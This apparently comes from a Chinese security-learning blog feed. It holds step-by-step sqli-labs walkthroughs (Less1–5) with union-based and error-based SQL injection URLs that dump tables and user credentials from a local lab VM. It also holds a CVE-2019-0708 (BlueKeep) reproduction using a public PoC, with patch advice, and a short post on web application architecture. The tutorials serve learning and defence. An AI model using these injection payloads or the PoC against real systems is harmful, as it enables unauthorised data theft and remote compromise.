start="5"><li><strong>爆字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/p8UvOKb9SFwnQtN.png" alt="less5-9.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/oplvc9CgKjSPOet.png" alt="less5-10.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/LpKtAQPj4zf3FTv.png" alt="less5-11.png"></p><ol start="6"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/Kyk4fXjqtHO9B1F.png" alt="less5-12.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/NgponACb6TuJMHK.png" alt="less5-13.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8313608.html" target="_blank" rel="noopener">【sqli-labs】 less5 GET - Double Injection - Single Quotes - String (双查询注入GET单引号字符型注入)</a></p><p><a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">Double SQL Injection（双查询注入）</a></p><p><a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">Floor报错原理分析</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web应用架构</title>
      <link href="/2019/09/23/web%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2019/09/23/web%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="web-应用工作流程"><a href="#web-应用工作流程" class="headerlink" title="web 应用工作流程"></a>web 应用工作流程</h1><p><img src="https://i.loli.net/2019/09/27/7bOLa2pf3rvFwCc.png" alt="web.png"></p><ol><li><p>首先使用 User’s browser 访问<a href="https://www.storyblocks.com/stock-image/strong-beautiful-fog-and-sunbeams-in-the-forest-bxxg0dvxdzj6gt9ini" target="_blank" rel="noopener">图片网站</a>，然后浏览器向 DNS 服务器发送请求，最后 User’s browser 从 DNS 服务器获取 IP 地址。</p></li><li><p>User’s browser 向 web Application server（web应用服务器） 发送请求，请求会先到达 Load Balancer(负载均衡服务)</p></li><li><p>Load Balancer 向多个 web Application server 发送这个请求，其中资源使用率最少的 web Application server 来处理这个请求。</p></li><li><p>web Application server 向 Caching Service（缓存服务）查找图片信息。</p></li><li><p>web Application server 从数据库中调取其他信息。</p></li><li><p>（a）当 web Application server 发现图片还没有进行色彩渲染，于是便向 Job Queue（任务队列） 发送 “色彩渲染” 的任务。（b）Job Server（任务服务）从 Job Queue（任务队列）中获取色彩渲染的任务进行异步计算，计算结束后再将结果更新到数据库。</p></li><li><p>Web Application Server会给search service(搜索服务)发送搜索请求，以图片的标题作为关键词，来查找相似的图片。</p></li><li><p>如果用户恰好是登录状态，Web Application Server会去访问Account Service(账号服务器)来获取账号信息。</p></li><li><p>（a）Web Application Server 会给 data firehose (数据加载服务)发送一个 Page View (网页浏览)事件，（b）并把它记录到的 Cloud Storage System(存储云)，（c）最终加载到 的Data Warehouse (数据仓库)中，并将这些数据提供给数据分析师来进行商务分析。</p></li><li><p>Web Application Server 会渲染出 HTML，并把它通过 Load Balancer 发送给用户的浏览器。页面中的 JavaScript 和 CSS 文件存储在我们的 Cloud Storage System (存储云)中</p></li><li><p>通过 CDN 进行分发 javascript 和 CSS 文件。因此，用户的浏览器会直接访问 CDN 来获取 JavaScript 和 CSS 文件。最后，浏览器再渲染整个页面给用户看。</p></li></ol><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://juejin.im/post/5b69a8eef265da0f926baa56#heading-10" target="_blank" rel="noopener">[译] Web 应用架构基础课</a></p><p><a href="https://blog.csdn.net/fundebug/article/details/81867196" target="_blank" rel="noopener">Web应用架构入门之11个基本要素</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less4</title>
      <link href="/2019/09/16/sqli-labs%20Less4/"/>
      <url>/2019/09/16/sqli-labs%20Less4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关是 “双引号+括号” 的字符型注入，SQL执行语句为<code>select * from 表名 where id=("1")</code></p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于错误的GET双引号字符型注入"><a href="#基于错误的GET双引号字符型注入" class="headerlink" title="基于错误的GET双引号字符型注入"></a>基于错误的GET双引号字符型注入</h2><ol><li><strong>GET 方式提交 id</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/19/he6pGSZLnzi1TDM.png" alt="less4-1.png"></p><ol start="2"><li><strong>添加 “单引号”，无报错</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=1'</code></pre><p><img src="https://i.loli.net/2019/09/19/2EHuTXJgWzqVepR.png" alt="less4-2.png"></p><ol start="3"><li><strong>添加 “双引号”报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=1"</code></pre><p><img src="https://i.loli.net/2019/09/19/GuBp4ZdMQLvySKb.png" alt="less4-3.png"></p><ol start="4"><li><strong>order by 猜测字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=1") order by 4%23</code></pre><p><img src="https://i.loli.net/2019/09/19/uh2YiQnCaPcXVDN.png" alt="less4-4.png"></p><ol start="5"><li><strong>查看字段显示位置</strong></li></ol><pre><code>192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/19/UXosdxFR3GbS8AC.png" alt="less4-5.png"></p><ol start="6"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre><code>192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/19/BiHf9dv8q7h61Et.png" alt="less4-6.png"></p><ol start="7"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23</code></pre><p><img src="https://i.loli.net/2019/09/19/tTxAJIonLFMdHji.png" alt="less4-7.png"></p><ol start="8"><li><strong>爆表中的字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23</code></pre><p><img src="https://i.loli.net/2019/09/19/l41pBASQqw9EkjW.png" alt="less4-8.png"></p><ol start="9"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/19/nBE2Yqu6stT59jy.png" alt="less4-9.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8313314.html" target="_blank" rel="noopener">【sqli-labs】 less4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[漏洞复现]CVE-2019-0708</title>
      <link href="/2019/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-0708/"/>
      <url>/2019/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-0708/</url>
      
        <content type="html"><![CDATA[<p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2019 年 5 月 14 日微软官方发布安全补丁，其中修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。由于该漏洞存在于 RDP 协议的预身份验证阶段，因此漏洞利用无需进行用户交互操作。该漏洞存在被不法分子利用进行蠕虫攻击的可能。该漏洞不会影响到 windows 8.1 和 windows 10。</p><h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>测试机：parrot</p><p>靶机：win7 企业版 32 位（需要开启3389）</p><p>测试机IP：192.168.150.130</p><p>靶机IP：192.168.150.132</p><h2 id="测试机"><a href="#测试机" class="headerlink" title="测试机"></a>测试机</h2><ul><li>下载 poc</li></ul><pre><code>git clone https://github.com/n1xbyte/CVE-2019-0708.git</code></pre><ul><li>安装执行 poc 的库</li></ul><pre><code>pip3 install impacket</code></pre><h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>开启 3389</p><p><img src="https://i.loli.net/2019/09/16/C4nDQa7jlzAZo52.png" alt="0708-1.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ol><li>更新 metasploit</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt-get install metasploit</span></code></pre><ol start="2"><li>扫描 cve-2019-0708 漏洞</li></ol><p><img src="https://i.loli.net/2019/09/16/sJILcO5Hw8MmFah.png" alt="0708-2.png"><br><img src="https://i.loli.net/2019/09/16/IB5pQLR72TivONZ.png" alt="0708-3.png"></p><p>注：the target is vulnerable（目标存在这个漏洞）</p><ol start="3"><li>运行 poc 脚本</li></ol><p><img src="https://i.loli.net/2019/09/16/HgMjharwt8BmXAL.png" alt="0708-4.png"></p><ol start="4"><li>查看 win7 运行状况</li></ol><p><img src="https://i.loli.net/2019/09/16/E3ZAnJ5tU6jdlKk.png" alt="0708-5.png"></p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol><li><p>安装杀毒软件</p></li><li><p>更新系统，打补丁</p><p> 补丁地址：</p><p> <a href="https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708" target="_blank" rel="noopener">Windows XP、Windows 2003</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499175" target="_blank" rel="noopener">Windows 7、Windows 2008R2</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499180" target="_blank" rel="noopener">Windows 2008</a></p></li><li><p>将 3389 设为 “网络身份认证”</p></li></ol><p><img src="https://i.loli.net/2019/09/16/qBTWYz8imMOZRH4.png" alt="0708-6.png"></p><ol start="4"><li><p>开启防火墙，阻止 3389 数据通过</p></li><li><p>关闭 3389 端口</p></li></ol><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.jianshu.com/p/2363c6364bb7" target="_blank" rel="noopener">【漏洞复现】CVE 2019-0708 漏洞利用</a></p><p><a href="https://blog.csdn.net/qq37724861/article/details/90286293" target="_blank" rel="noopener">CVE-2019-0708 微软补丁更新</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> RDP </tag>
            
            <tag> cve-2019-0708 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less3</title>
      <link href="/2019/09/15/sqli-labs%20Less3/"/>
      <url>/2019/09/15/sqli-labs%20Less3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关是 “单引号+括号” 的字符型注入，SQL执行语句为<code>select * from 表名 where id=('1')</code></p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于错误的GET单引号变形字符型注入"><a href="#基于错误的GET单引号变形字符型注入" class="headerlink" title="基于错误的GET单引号变形字符型注入"></a>基于错误的GET单引号变形字符型注入</h2><ol><li><strong>GET 方式提交 id</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/15/bDk6cAvFt1KHLih.png" alt="less-3-1.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=1'</code></pre><p><img src="https://i.loli.net/2019/09/15/lDahJc16OZIt2Mj.png" alt="less-3-2.png"></p><p>从 <font color="red">‘1’’) LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=(‘1’) limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 1%23......http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 4%23</code></pre><p><img src="https://i.loli.net/2019/09/15/XAgYZGJdphajutm.png" alt="less-3-3.png"></p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/15/NhwYyp4aUSGdti7.png" alt="less-3-4.png"></p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/15/6QBAjReh4FlnLZT.png" alt="less-3-5.png"></p><ol start="6"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23</code></pre><p><img src="https://i.loli.net/2019/09/15/lpMxdXcFByGUJtH.png" alt="less-3-6.png"></p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23</code></pre><p><img src="https://i.loli.net/2019/09/15/bxhCuIB4iw6ntK5.png" alt="less-3-8.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/15/YyNp6tkK2PMUoLG.png" alt="less-3-7.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8313233.html" target="_blank" rel="noopener">【sqli-labs】 less3 GET - Error based - Single quotes with twist string(基于错误的GET单引号变形字符型注入)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less2</title>
      <link href="/2019/09/15/sqli-labs%20Less2/"/>
      <url>/2019/09/15/sqli-labs%20Less2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关是整型注入。SQL执行语句为<code>select * from 表名 where id=1</code></p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="GET-型基于错误的整型注入"><a href="#GET-型基于错误的整型注入" class="headerlink" title="GET 型基于错误的整型注入"></a>GET 型基于错误的整型注入</h2><ol><li><strong>GET 方式提交 id</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/15/hczVTEGkLxBKqg3.png" alt="less2-1.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=1'</code></pre><p><img src="https://i.loli.net/2019/09/15/OfAUBh3GtZVC1Sa.png" alt="less2-9.png"></p><p>从 <font color="red">‘ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=1 limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 1%23......http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 4%23 </code></pre><p><img src="https://i.loli.net/2019/09/15/t2iVy8IpFEuqC4v.png" alt="less2-3.png"></p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/15/rRZdH8sDgtSEU9z.png" alt="less2-4.png"></p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/15/t49AcbmUJz5oqRe.png" alt="less2-5.png"></p><ol start="6"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23</code></pre><p><img src="https://i.loli.net/2019/09/15/o58QxD4vF27AnON.png" alt="less2-6.png"></p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23</code></pre><p><img src="https://i.loli.net/2019/09/15/5SQJhzNPgod3REq.png" alt="less2-7.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/15/RdtWMP52Z9SOe8B.png" alt="less2-8.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8313148.html" target="_blank" rel="noopener">【sqli-labs】 less2 GET - Error based - Intiger based (基于错误的GET整型注入)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less1</title>
      <link href="/2019/09/10/sqli-labs%20Less1/"/>
      <url>/2019/09/10/sqli-labs%20Less1/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为是正常的 SQL 命令来运行。</p><p><img src="https://i.loli.net/2019/10/10/jNa3tZQyVJgDIHn.png" alt="less-1-1.png"></p><h2 id="SQL-注入的类型"><a href="#SQL-注入的类型" class="headerlink" title="SQL 注入的类型"></a>SQL 注入的类型</h2><h3 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h3><ul><li><p>数字型注入点<br>许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递 id 等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code></p></li><li><p>字符型注入点<br>网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code></p></li><li><p>搜索型注入点<br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>keyword=关键字</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code></p></li></ul><h3 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h3><ul><li><p>GET 注入<br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code>, id 是注入点。</p></li><li><p>POST 注入<br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p></li><li><p>Cookie 注入<br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p></li><li><p>HTTP 头部注入<br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p></li></ul><h3 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h3><ul><li><p>基于布尔的盲注<br>即可以根据返回页面判断条件真假的注入。</p></li><li><p>基于时间的盲注<br>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p></li><li><p>基于报错注入<br>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p></li><li><p>联合查询注入<br>可以使用union的情况下的注入。</p></li><li><p>堆查询注入<br>可以同时执行多条语句的执行时的注入。</p></li><li><p>宽字节注入<br>宽字节注入源于程序员设置 MySQL 连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p></li></ul><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p><img src="https://i.loli.net/2019/09/12/wRNZ32vybPloCUe.png" alt="less-1.png"></p><p>当我输入上面的 URL 时，浏览器就会发送 sql 命令</p><pre class=" language-mysql"><code class="language-mysql">select * from TABLE where id='1' limit 0,1;</code></pre><p>给服务器，之后服务器会将结果传输给浏览器，最后浏览器将数据展示页到面上给用户看。</p><p><img src="https://i.loli.net/2019/09/12/JYhq5CG6jgbOkwV.png" alt="less-2.png"></p><p>之后通过修改 URL，达到服务器执行插入的 SQL 命令，并返回到页面上。这里浏览器发送sql命令是：</p><pre class=" language-mysql"><code class="language-mysql">select * from TABLE where id='-1' union select 1,database(),2;--+' limit 0,1;</code></pre><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="GET-型基于错误的单引号字符型注入"><a href="#GET-型基于错误的单引号字符型注入" class="headerlink" title="GET 型基于错误的单引号字符型注入"></a>GET 型基于错误的单引号字符型注入</h2><ol><li><strong>GET 方式提交 id</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/13/QEuwBkNStycYWp9.png" alt="less-3.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1'</code></pre><p><img src="https://i.loli.net/2019/09/13/qfNOhSmYiIuojr9.png" alt="less-4.png"></p><p>从 <font color="red">‘1’’ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=’1’ limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 1%23......http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 4%23 </code></pre><p><img src="https://i.loli.net/2019/09/14/5xpfnLvgQbMo2GY.png" alt="less-5.png"></p><p><strong>PS：</strong><br>order by 4  时页面报错，判断 TABLE 字段数为3。<br>这里的 %23 表示的是 “#” 符号，用来注释后面的语句。字符 “#” 浏览器不会编码，需要手动编码 %23</p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/14/1uhvRM2CylzDiNE.png" alt="less-6.png"></p><p><strong>PS：</strong><br>union 之前的语句必须返回空值，因为 mysql_fetch_array() 函数 只能获取一条信息。也就是说：整个 SQL 语句中，只能返回一个 SQL 执行结果。</p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/14/ckphjUCl9RsW3wM.png" alt="less-07.png"></p><p><strong>PS：</strong><br>user()：获取当前登录的数据库用户<br>database()：获取数据库名称6</p><ol start="6"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23</code></pre><p><img src="https://i.loli.net/2019/09/14/CRAPlKj9MOSth7u.png" alt="less-8.png"></p><p><strong>PS：</strong><br>group_concat()  函数可以让查询获得的数据组成一行显示。</p><p>在 MySQL 中，把 information_schema 是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23</code></pre><p><img src="https://i.loli.net/2019/09/14/lqsM6SErwChAzHe.png" 